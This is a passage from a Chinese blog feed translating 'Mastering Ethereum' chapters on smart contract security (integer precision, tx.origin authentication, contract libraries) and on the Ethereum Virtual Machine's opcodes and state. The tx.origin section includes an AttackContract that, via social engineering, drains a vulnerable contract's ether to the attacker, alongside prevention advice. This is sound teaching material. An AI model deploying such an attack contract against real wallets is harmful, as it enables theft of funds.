wiki</a>。</th></tr></thead></table><h3 id="漏洞-14"><a href="#漏洞-14" class="headerlink" title="漏洞"></a>漏洞</h3><p>由于 Solidity 中没有定点类型，因此要求开发人员使用标准整数数据类型实现自己的需求。在此过程中，开发人员可能会遇到许多陷阱。我们将尝试在本节中强调其中的一些。</p><p>让我们从一个代码示例开始（为简单起见，我们将忽略本章前面讨论过的上溢&#x2F;下溢问题）：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">FunWithNumbers</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">uint</span> <span class="token keyword">constant</span> <span class="token keyword">public</span> tokensPerEth <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>    <span class="token builtin">uint</span> <span class="token keyword">constant</span> <span class="token keyword">public</span> weiPerEth <span class="token operator">=</span> <span class="token number">1e18</span><span class="token punctuation">;</span>    <span class="token keyword">mapping</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token operator">=></span> <span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">public</span> balances<span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">buyTokens</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// convert wei to eth, then multiply by token rate</span>        <span class="token builtin">uint</span> tokens <span class="token operator">=</span> msg<span class="token punctuation">.</span>value<span class="token operator">/</span>weiPerEth<span class="token operator">*</span>tokensPerEth<span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">+=</span> tokens<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">sellTokens</span><span class="token punctuation">(</span><span class="token builtin">uint</span> tokens<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">>=</span> tokens<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin">uint</span> eth <span class="token operator">=</span> tokens<span class="token operator">/</span>tokensPerEth<span class="token punctuation">;</span>        balances<span class="token punctuation">[</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">]</span> <span class="token operator">-=</span> tokens<span class="token punctuation">;</span>        msg<span class="token punctuation">.</span>sender<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span>eth<span class="token operator">*</span>weiPerEth<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这个简单的代币买卖合约有一些明显的问题。虽然买卖代币的数学计算是正确的，但缺少浮点数会给出错误的结果。例如，在第 8 行购买代币时，如果值小于 <code>1 ether</code>，则初始除法将导致 <code>0</code>，最终乘法的结果为 <code>0</code>（例如，200 wei 除以 <code>1e18</code> <code>weiPerEth</code>等于<code>0</code>）。同样，在出售代币时，任何少于 <code>10</code> 个的代币也将导致 <code>0 ether</code>。事实上，这里的四舍五入总是向下，所以卖出 <code>29 tokens</code> 将得到 <code>2 ether</code>。</p><p>该合约的问题在于精度仅到最接近的以太币（如 1e18 wei）。当您需要更高的精度时，在处理 ERC20 代币中的小数时，这可能会变得很棘手。</p><h3 id="预防技术-14"><a href="#预防技术-14" class="headerlink" title="预防技术"></a>预防技术</h3><p>在您的智能合约中保持正确的精度非常重要，尤其是在处理反映经济决策的比率和利率时。</p><p>您应该确保您使用的任何 ratio 或 rate 都允许分数中的大分子(large numerator)。例如，我们在示例中使用了 rate <code>tokensPerEth</code>。使用 <code>weiPerTokens</code> 会更好，这将是一个很大的数字。要计算相应的代币数量，我们可以执行 <code>msg.value/weiPerTokens</code>。这将给出更精确的结果。</p><p>要记住的另一个策略是注意操作顺序。在我们的示例中，购买代币的计算是 <code>msg.value/weiPerEth*tokenPerEth</code>。请注意，除法发生在乘法之前。 （与某些语言不同，Solidity 保证按照编写顺序执行操作。）如果计算先执行乘法然后执行除法，则此示例将获得更高的精度；即 <code>msg.value*tokenPerEth/weiPerEth</code>。</p><p>最后，在为数字定义任意精度时，最好将值转换为更高的精度，执行所有数学运算，然后最终转换回输出所需的精度。通常使用 uint256（因为它们最适合gas使用）；这些在它们的范围内给出了大约 60 个数量级，其中一些可以专用于数学运算的精度。在 Solidity 中保持所有变量的高精度并在外部应用程序中转换回较低精度可能会更好（这本质上是 <code>decimals</code> 变量在 ERC20 代币合约中的工作方式）。要查看如何完成此操作的示例，我们建议查看 <a href="https://github.com/dapphub/ds-math">DS-Math</a>。它使用了一些时髦的命名（“wads”和“rays”），但这个概念很有用。</p><h3 id="现实世界的例子：Ethstick"><a href="#现实世界的例子：Ethstick" class="headerlink" title="现实世界的例子：Ethstick"></a>现实世界的例子：Ethstick</h3><p><a href="https://etherscan.io/address/0xbA6284cA128d72B25f1353FadD06Aa145D9095Af#code">Ethstick</a> 合约不使用扩展精度；但是，它与 wei 打交道。所以，这个合约会有四舍五入的问题，但仅限于 wei 级别的精度。它有一些更严重的缺陷，但这些缺陷与在区块链上获取熵的困难有关（参见熵错觉）。</p><h2 id="Tx-Origin-身份认证-Tx-Origin-Authentication"><a href="#Tx-Origin-身份认证-Tx-Origin-Authentication" class="headerlink" title="Tx.Origin 身份认证 (Tx.Origin Authentication)"></a>Tx.Origin 身份认证 (Tx.Origin Authentication)</h2><p>Solidity 有一个全局变量 <code>tx.origin</code>，它会遍历整个调用栈，并包含最初发送调用（或交易）的账户地址。在智能合约中使用此变量进行身份验证会使合约容易受到类似网络钓鱼的攻击。</p><table><thead><tr><th>Note</th><th>如需进一步阅读，请参阅 dbryson 的 <a href="https://ethereum.stackexchange.com/questions/1891/whats-the-difference-between-msg-sender-and-tx-origin">Ethereum Stack Exchange question</a> 和 Chris Coverdale 的“<a href="https://medium.com/coinmonks/solidity-tx-origin-attacks-58211ad95514">Solidity: Tx Origin Attacks</a>”。</th></tr></thead></table><h3 id="漏洞-15"><a href="#漏洞-15" class="headerlink" title="漏洞"></a>漏洞</h3><p>使用 <code>tx.origin</code> 变量授权用户的合约通常容易受到网络钓鱼攻击，这些攻击可以诱骗用户对易受攻击的合约执行经过身份验证的操作。</p><p>考虑 Phishable.sol 中的简单合约。</p><p>示例13. Phishable.sol</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">Phishable</span> <span class="token punctuation">&#123;</span>    <span class="token builtin">address</span> <span class="token keyword">public</span> owner<span class="token punctuation">;</span>    <span class="token keyword">constructor</span> <span class="token punctuation">(</span><span class="token builtin">address</span> _owner<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        owner <span class="token operator">=</span> _owner<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token comment">// collect ether</span>    <span class="token keyword">function</span> <span class="token function">withdrawAll</span><span class="token punctuation">(</span><span class="token builtin">address</span> _recipient<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>tx<span class="token punctuation">.</span>origin <span class="token operator">==</span> owner<span class="token punctuation">)</span><span class="token punctuation">;</span>        _recipient<span class="token punctuation">.</span><span class="token function">transfer</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>请注意，在第 11 行，合约使用 <code>tx.origin</code> 授权了 <code>withdrawAll</code> 函数。该合约允许攻击者创建以下形式的攻击合约：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">import</span> <span class="token string">"Phishable.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">AttackContract</span> <span class="token punctuation">&#123;</span>    Phishable phishableContract<span class="token punctuation">;</span>    <span class="token builtin">address</span> attacker<span class="token punctuation">;</span> <span class="token comment">// The attacker's address to receive funds</span>    <span class="token keyword">constructor</span> <span class="token punctuation">(</span>Phishable _phishableContract<span class="token punctuation">,</span> <span class="token builtin">address</span> _attackerAddress<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        phishableContract <span class="token operator">=</span> _phishableContract<span class="token punctuation">;</span>        attacker <span class="token operator">=</span> _attackerAddress<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">payable</span> <span class="token punctuation">&#123;</span>        phishableContract<span class="token punctuation">.</span><span class="token function">withdrawAll</span><span class="token punctuation">(</span>attacker<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>攻击者可能会将该合约伪装成他们自己的私人地址，并对受害者（Phishable 合约的所有者）进行社会工程，以向该地址发送某种形式的交易——也许向该合约发送一定数量的以太币。除非小心，否则受害者可能不会注意到攻击者的地址有代码，或者攻击者可能会将其伪装成多重签名钱包或某些高级存储钱包（请记住，默认情况下公共合约的源代码不可用）。</p><p>在任何情况下，如果受害者向 <code>AttackContract</code> 地址发送了一笔足够 gas 的交易，它就会调用 fallback 函数，该函数又会调用带有参数 <code>attacker</code>的 <code>Phishable</code>合约的<code>withdrawAll</code> 函数。这将导致从 <code>Phishable</code> 合约中提取所有资金到 <code>attacker</code> 地址。这是因为首先初始化调用的地址是受害者（即 <code>Phishable</code> 合约的所有者）。因此，<code>tx.origin</code> 将等于 <code>owner</code>，<code>Phishable</code> 合约第 11 行的要求将通过。</p><h3 id="预防技术-15"><a href="#预防技术-15" class="headerlink" title="预防技术"></a>预防技术</h3><p><code>tx.origin</code> 不应用于智能合约中的授权。这并不是说永远不应该使用 <code>tx.origin</code> 变量。它在智能合约中确实有一些合法的用例。例如，如果想要拒绝外部合约调用当前合约，可以实现形式为 <code>require(tx.origin == msg.sender)</code> 的 <code>require</code>。这可以防止使用中间合约来调用当前合约，从而将合约限制为常规无代码地址。</p><h2 id="合约库-Contract-Libraries"><a href="#合约库-Contract-Libraries" class="headerlink" title="合约库 (Contract Libraries)"></a>合约库 (Contract Libraries)</h2><p>有很多现有代码可供重用，既部署在链上作为可调用库，又部署在链下作为代码模板库。已部署的平台库以字节码智能合约的形式存在，因此在生产中使用它们之前应格外小心。但是，使用完善的现有平台库具有许多优势，例如能够从最新升级中受益，并通过减少以太坊中的实时合约总数为您节省资金并有益于以太坊生态系统。</p><p>在以太坊中，使用最广泛的资源是 <a href="https://www.openzeppelin.com/contracts">OpenZeppelin</a> 套件，它是一个丰富的合约库，范围从 ERC20 和 ERC721 代币的实现，到多种众筹模型，再到合约中常见的简单行为，例如 <code>Ownable</code>、<code>Pausable</code> 或 <code>LimitBalance</code> 。这个存储库中的合约已经过广泛的测试，在某些情况下甚至可以作为事实上的标准实现。它们可以免费使用，并且由 <a href="https://www.openzeppelin.com/">OpenZeppelin</a> 与不断增长的外部贡献者列表一起构建和维护。</p><p>Zeppelin 还提供了 <a href="https://www.openzeppelin.com/defender">OpenZeppelin | Defender</a>，这是一个开源的服务和工具平台，用于安全地开发和管理智能合约应用程序。 它在 EVM 之上提供了一个层，使开发人员可以轻松地启动可升级的 DApp，这些 DApp 链接到链上库，其中包含经过良好测试的合约，这些合约本身是可升级的。这些库的不同版本可以在以太坊平台上共存，并且担保系统允许用户提出或推动不同方向的改进。该平台还提供了一套用于调试、测试、部署和监控去中心化应用程序的链下工具。</p><p>ethpm 项目旨在通过提供包管理系统来组织生态系统中正在开发的各种资源。因此，他们的注册表提供了更多示例供您浏览：</p><ul><li>Website: <a href="https://www.ethpm.com/">https://www.ethpm.com/</a></li><li>Repository link: <a href="https://www.ethpm.com/registry">https://www.ethpm.com/registry</a></li><li>GitHub link: <a href="https://github.com/ethpm">https://github.com/ethpm</a></li><li>Documentation: <a href="https://www.ethpm.com/docs/integration-guide">https://www.ethpm.com/docs/integration-guide</a></li></ul><h2 id="结论-Conclusions"><a href="#结论-Conclusions" class="headerlink" title="结论 (Conclusions)"></a>结论 (Conclusions)</h2><p>任何在智能合约领域工作的开发人员都需要了解和理解很多东西。通过遵循智能合约设计和代码编写的最佳实践，您将避免许多严重的陷阱和陷阱。</p><p>也许最基本的软件安全原则是最大限度地重用受信任的代码。在密码学中，这非常重要，以至于被浓缩成一句格言：“不要推出自己的加密货币。”就智能合约而言，这相当于从经过社区彻底审查的免费可用库中获得尽可能多的收益。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;精通以太坊：智能合约安全&quot;&gt;&lt;a href=&quot;#精通以太坊：智能合约安全&quot; class=&quot;headerlink&quot; title=&quot;精通以太坊：智能合约安全&quot;&gt;&lt;/a&gt;精通以太坊：智能合约安全&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;本文内容是对 &lt;a href=&quot;h</summary>
      
    
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="精通以太坊" scheme="https://alphafitz.com/categories/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/%E7%B2%BE%E9%80%9A%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    
    <category term="区块链技术" scheme="https://alphafitz.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF/"/>
    
    <category term="以太坊" scheme="https://alphafitz.com/tags/%E4%BB%A5%E5%A4%AA%E5%9D%8A/"/>
    
    <category term="区块链安全" scheme="https://alphafitz.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>精通以太坊：以太坊虚拟机</title>
    <link href="https://alphafitz.com/2022/09/12/mastering-ethereum-the-ethereum-virtual-machine/"/>
    <id>https://alphafitz.com/2022/09/12/mastering-ethereum-the-ethereum-virtual-machine/</id>
    <published>2022-09-12T12:53:09.000Z</published>
    <updated>2022-10-25T08:55:19.513Z</updated>
    
    <content type="html"><![CDATA[<h1 id="精通以太坊：以太坊虚拟机"><a href="#精通以太坊：以太坊虚拟机" class="headerlink" title="精通以太坊：以太坊虚拟机"></a>精通以太坊：以太坊虚拟机</h1><blockquote><p>本文内容是对 <a href="https://github.com/ethereumbook/ethereumbook/blob/develop/13evm.asciidoc">Mastering Ethereum</a> 一书的 The Ethereum Virtual Machine 章节的翻译。</p></blockquote><p>以太坊协议和操作的核心是以太坊虚拟机，简称 EVM。正如您可能从名称中猜到的那样，它是一个计算引擎，与 Microsoft 的 .NET Framework 的虚拟机或其他字节码编译的编程语言（如 Java）的解释器没有太大的不同。在本章中，我们将在以太坊状态更新的背景下详细了解 EVM，包括其指令集、结构和操作。</p><h2 id="什么是EVM"><a href="#什么是EVM" class="headerlink" title="什么是EVM?"></a>什么是EVM?</h2><p>EVM 是以太坊中处理智能合约部署和执行的一部分。实际上，从一个 EOA 到另一个的简单价值转移交易不需要涉及它，但其他一切都将涉及由 EVM 计算的状态更新。在高层次上，运行在以太坊区块链上的 EVM 可以被认为是一个全球分散的计算机，包含数百万个可执行对象，每个对象都有自己的永久数据存储。</p><p>EVM 是一个准图灵完备的状态机； “准”，因为所有执行过程都被限制在有限数量的计算步骤中，这取决于任何给定的智能合约执行可用的gas量。因此，停止问题得到了“解决”（所有程序执行都将停止），并且避免了执行可能（意外或恶意）永远运行的情况，从而使以太坊平台完全停止。</p><p><strong>EVM 具有基于堆栈的架构，将所有内存中的值存储在堆栈中。</strong>它<strong>使用 256 位的字长</strong>（主要是为了促进本机散列和椭圆曲线操作），并<strong>具有几个可寻址的数据组件</strong>：</p><ul><li>一个不可变的程序代码 ROM，加载了要执行的智能合约的字节码</li><li>易失性存储器，每个位置都显式初始化为零</li><li>作为以太坊状态一部分的永久存储，也是零初始化的</li></ul><p>还有一组<strong>在执行期间可用的环境变量和数据</strong>。我们将在本章后面更详细地介绍这些内容。</p><p><a href="https://github.com/ethereumbook/ethereumbook/blob/develop/13evm.asciidoc#evm_architecture">The Ethereum Virtual Machine (EVM) Architecture and Execution Context</a> 显示了 EVM 架构和执行上下文。</p><img src="/2022/09/12/mastering-ethereum-the-ethereum-virtual-machine/image-20220912093705-1sm4j4h.png" class="" title="以太坊虚拟机 (EVM) 架构和执行上下文"><center> 以太坊虚拟机(EVM)架构和执行上下文 </center><img src="/2022/09/12/mastering-ethereum-the-ethereum-virtual-machine/image-20220912110351-pk67820.png" class="" title="网上的EVM架构图"><center> 网上的EVM架构图 </center><p>从上图的角度看，EVM与典型的冯诺依曼架构不同，程序代码和存储是分开存储的。</p><h3 id="与现有技术的比较"><a href="#与现有技术的比较" class="headerlink" title="与现有技术的比较"></a>与现有技术的比较</h3><p>术语“虚拟机”通常用于真实计算机的虚拟化，通常由“管理程序”（如 VirtualBox 或 QEMU）或整个操作系统实例（如 Linux 的 KVM）进行虚拟化。这些必须分别提供实际硬件、系统调用和其他内核功能的软件抽象。</p><p><strong>EVM 在一个更有限的领域中运行：它只是一个计算引擎，因此提供了计算和存储的抽象</strong>，例如类似于 Java 虚拟机 (JVM) 规范。从高级的角度来看，JVM 旨在提供一个与底层主机操作系统或硬件无关的运行时环境，从而实现跨多种系统的兼容性。高级编程语言，例如 Java 或 Scala（使用 JVM）或 C#（使用 .NET）被编译到各自虚拟机的字节码指令集中。同样，<strong>EVM 执行自己的字节码指令集</strong>（在下一节中介绍），将 LLL、Serpent、Mutan 或 Solidity 等高级智能合约编程语言编译成这些指令集。</p><p>因此，<strong>EVM 没有调度能力，因为执行顺序是在其外部组织的</strong> —— <strong>以太坊客户端运行经过验证的块交易，以确定哪些智能合约需要执行以及以何种顺序执行</strong>。从这个意义上说，以太坊世界的计算机是单线程的，就像 JavaScript 一样。 <strong>EVM 也没有任何“系统接口”处理或“硬件支持”</strong>—— 没有物理机器可以与之交互。以太坊世界计算机是完全虚拟的。</p><h3 id="EVM指令集（字节码操作）"><a href="#EVM指令集（字节码操作）" class="headerlink" title="EVM指令集（字节码操作）"></a>EVM指令集（字节码操作）</h3><p>EVM 指令集提供了您可能期望的大部分操作，包括：</p><ul><li>算术和按位逻辑运算</li><li>执行上下文查询</li><li>堆栈、内存和存储访问（因此有三个存储类型）</li><li>控制流操作</li><li>日志、调用和其他操作码(<em>Logging, calling, and other operators</em>)</li></ul><p>除了典型的字节码操作，EVM 还可以访问账户信息（例如地址和余额）和区块信息（例如区块号和当前 gas 价格）。</p><p>让我们通过查看可用的操作码及其作用来更详细地探索 EVM。如您所料，所有操作数都从堆栈中取出，结果（如果适用）通常放回堆栈顶部。</p><table><thead><tr><th>Note</th><th>可以在<a href="https://github.com/ethereumbook/ethereumbook/blob/develop/13evm.asciidoc#evm_opcodes">evm_opcodes</a>中找到完整的操作码列表及其相应的 gas 成本。</th></tr></thead></table><p>（即执行每一个操作码都有对应的 gas 成本）</p><p>可用的操作码可以分为以下几类：</p><p><em>算术运算</em></p><p>算术操作码指令：</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">ADD        &#x2F;&#x2F;Add the top two stack itemsMUL        &#x2F;&#x2F;Multiply the top two stack itemsSUB        &#x2F;&#x2F;Subtract the top two stack itemsDIV        &#x2F;&#x2F;Integer divisionSDIV       &#x2F;&#x2F;Signed integer divisionMOD        &#x2F;&#x2F;Modulo (remainder) operationSMOD       &#x2F;&#x2F;Signed modulo operationADDMOD     &#x2F;&#x2F;Addition modulo any numberMULMOD     &#x2F;&#x2F;Multiplication modulo any numberEXP        &#x2F;&#x2F;Exponential operationSIGNEXTEND &#x2F;&#x2F;Extend the length of a two&#39;s complement signed integerSHA3       &#x2F;&#x2F;Compute the Keccak-256 hash of a block of memory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>请注意，所有算术都是以 $2^{256}$ 为模执行的（除非另有说明），并且零的零次方 $0^0$ 被视为 1。</p><p><em>堆栈操作</em></p><p>堆栈、内存和存储管理指令：</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">POP     &#x2F;&#x2F;Remove the top item from the stackMLOAD   &#x2F;&#x2F;Load a word from memoryMSTORE  &#x2F;&#x2F;Save a word to memoryMSTORE8 &#x2F;&#x2F;Save a byte to memorySLOAD   &#x2F;&#x2F;Load a word from storageSSTORE  &#x2F;&#x2F;Save a word to storageMSIZE   &#x2F;&#x2F;Get the size of the active memory in bytesPUSHx   &#x2F;&#x2F;Place x byte item on the stack, where x can be any integer from        &#x2F;&#x2F; 1 to 32 (full word) inclusiveDUPx    &#x2F;&#x2F;Duplicate the x-th stack item, where x can be any integer from        &#x2F;&#x2F; 1 to 16 inclusiveSWAPx   &#x2F;&#x2F;Exchange 1st and (x+1)-th stack items, where x can be any        &#x2F;&#x2F; integer from 1 to 16 inclusive<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><em>进程(process)流操作</em></p><p>控制流指令：</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">STOP      &#x2F;&#x2F;Halt executionJUMP      &#x2F;&#x2F;Set the program counter to any valueJUMPI     &#x2F;&#x2F;Conditionally alter the program counterPC        &#x2F;&#x2F;Get the value of the program counter (prior to          &#x2F;&#x2F;the increment corresponding to this instruction)JUMPDEST  &#x2F;&#x2F;Mark a valid destination for jumps<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><em>系统操作</em></p><p>系统执行程序的操作码：</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">LOGx          &#x2F;&#x2F;Append a log record with x topics, where x is any integer              &#x2F;&#x2F;from 0 to 4 inclusiveCREATE        &#x2F;&#x2F;Create a new account with associated codeCALL          &#x2F;&#x2F;Message-call into another account, i.e. run another              &#x2F;&#x2F;account&#39;s codeCALLCODE      &#x2F;&#x2F;Message-call into this account with another              &#x2F;&#x2F;account&#39;s codeRETURN        &#x2F;&#x2F;Halt execution and return output dataDELEGATECALL  &#x2F;&#x2F;Message-call into this account with an alternative              &#x2F;&#x2F;account&#39;s code, but persisting the current values for              &#x2F;&#x2F;sender and valueSTATICCALL    &#x2F;&#x2F;Static message-call into an accountREVERT        &#x2F;&#x2F;Halt execution, reverting state changes but returning              &#x2F;&#x2F;data and remaining gasINVALID       &#x2F;&#x2F;The designated invalid instructionSELFDESTRUCT  &#x2F;&#x2F;Halt execution and register account for deletion<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><em>逻辑运算</em></p><p>用于比较和按位逻辑的操作码：</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">LT     &#x2F;&#x2F;Less-than comparisonGT     &#x2F;&#x2F;Greater-than comparisonSLT    &#x2F;&#x2F;Signed less-than comparisonSGT    &#x2F;&#x2F;Signed greater-than comparisonEQ     &#x2F;&#x2F;Equality comparisonISZERO &#x2F;&#x2F;Simple NOT operatorAND    &#x2F;&#x2F;Bitwise AND operationOR     &#x2F;&#x2F;Bitwise OR operationXOR    &#x2F;&#x2F;Bitwise XOR operationNOT    &#x2F;&#x2F;Bitwise NOT operationBYTE   &#x2F;&#x2F;Retrieve a single byte from a full-width 256-bit word<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><em>环境操作</em></p><p>处理执行环境信息的操作码：</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">GAS            &#x2F;&#x2F;Get the amount of available gas               &#x2F;&#x2F;(after the reduction for this instruction)ADDRESS        &#x2F;&#x2F;Get the address of the currently executing accountBALANCE        &#x2F;&#x2F;Get the account balance of any given accountORIGIN         &#x2F;&#x2F;Get the address of the EOA that initiated this EVM               &#x2F;&#x2F;executionCALLER         &#x2F;&#x2F;Get the address of the caller immediately responsible               &#x2F;&#x2F;for this executionCALLVALUE      &#x2F;&#x2F;Get the ether amount deposited by the caller responsible               &#x2F;&#x2F;for this executionCALLDATALOAD   &#x2F;&#x2F;Get the input data sent by the caller responsible for               &#x2F;&#x2F;this executionCALLDATASIZE   &#x2F;&#x2F;Get the size of the input dataCALLDATACOPY   &#x2F;&#x2F;Copy the input data to memoryCODESIZE       &#x2F;&#x2F;Get the size of code running in the current environmentCODECOPY       &#x2F;&#x2F;Copy the code running in the current environment to               &#x2F;&#x2F;memoryGASPRICE       &#x2F;&#x2F;Get the gas price specified by the originating               &#x2F;&#x2F;transactionEXTCODESIZE    &#x2F;&#x2F;Get the size of any account&#39;s codeEXTCODECOPY    &#x2F;&#x2F;Copy any account&#39;s code to memoryRETURNDATASIZE &#x2F;&#x2F;Get the size of the output data from the previous call               &#x2F;&#x2F;in the current environmentRETURNDATACOPY &#x2F;&#x2F;Copy data output from the previous call to memory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><em>块操作</em></p><p>用于访问当前块信息的操作码：</p><figure><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">BLOCKHASH  &#x2F;&#x2F;Get the hash of one of the 256 most recently completed           &#x2F;&#x2F;blocksCOINBASE   &#x2F;&#x2F;Get the block&#39;s beneficiary address for the block rewardTIMESTAMP  &#x2F;&#x2F;Get the block&#39;s timestampNUMBER     &#x2F;&#x2F;Get the block&#39;s numberDIFFICULTY &#x2F;&#x2F;Get the block&#39;s difficultyGASLIMIT   &#x2F;&#x2F;Get the block&#39;s gas limit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="以太坊状态"><a href="#以太坊状态" class="headerlink" title="以太坊状态"></a>以太坊状态</h3><p>EVM 的工作是通过计算有效的状态转换来更新以太坊状态，这是由以太坊协议定义的智能合约代码执行的结果。<strong>这一方面导致将以太坊描述为基于交易的状态机，这反映了外部参与者（即账户持有者和矿工）通过创建、接收和订购交易来启动状态转换的事实。</strong>在这一点上考虑什么构成了以太坊状态是有用的。</p><p>在顶层，我们有以太坊世界状态(<em>world state</em>)。<strong>世界状态是以太坊地址（160 位值）到账户的映射。在较低级别，每个以太坊地址代表一个账户，包括一个以太币balance（存储为该账户拥有的 wei 数量）、一个nonce（如果它是 EOA，则表示从该账户成功发送的交易数量，或数量如果它是合约账户，则由它创建的合约的数量）、账户的storage（这是一个永久数据存储，仅由智能合约使用）和账户的 program code（同样，仅当账户是智能合约账户时）。 EOA 将始终没有代码和一个空存储。</strong></p><p><strong>当交易导致智能合约代码执行时，EVM 将被实例化</strong>，其中包含与正在创建的当前块和正在处理的特定交易相关的所有所需信息。特别是，<strong>EVM 的 程序代码 ROM 加载了被调用合约账户的代码，程序计数器设置为零，存储从合约账户的存储中加载，内存设置为全零，所有区块和环境变量被设置。</strong>一个关键变量是此执行的 gas 供应量，它设置为发送者在交易开始时支付的 gas 量（有关更多详细信息，请参阅 <a href="https://github.com/ethereumbook/ethereumbook/blob/develop/13evm.asciidoc#gas">Gas</a>）。<strong>随着代码执行的进行，gas 供应量会根据执行操作的 gas 成本而减少。</strong>如果在任何时候气体供应减少到零，我们会<strong>得到“gas不足(Out of Gas)”（OOG）异常；执行立即停止并放弃交易</strong>。不会对以太坊状态进行任何更改，除了<strong>发送者的随机数被增加并且他们的以太币余额下降以支付块的受益人用于执行代码到停止点的资源</strong>。此时，<strong>您可以认为 EVM 在以太坊世界状态的沙盒副本上运行，如果由于任何原因无法完成执行，该沙盒版本将被完全丢弃。但是，如果执行成功完成，那么真实世界状态会更新以匹配沙盒版本，包括对调用合约存储数据的任何更改、创建的任何新合约以及启动的任何以太余额转移</strong>。</p><p>请注意，<strong>由于智能合约本身可以有效地启动交易，因此代码执行是一个递归过程。一个合约可以调用其他合约，每次调用都会围绕调用的新目标实例化另一个 EVM。每个实例化都有其沙盒世界状态，该状态是从上层 EVM 的沙盒中初始化的。每个实例化也被赋予指定数量的 gas 用于其 gas 供应（当然不超过上述级别中剩余的 gas 量），因此可能会由于给定的 gas 太少而无法完成其执行而自行停止。同样，在这种情况下，沙盒状态被丢弃，执行返回到上一层的 EVM。</strong></p><h3 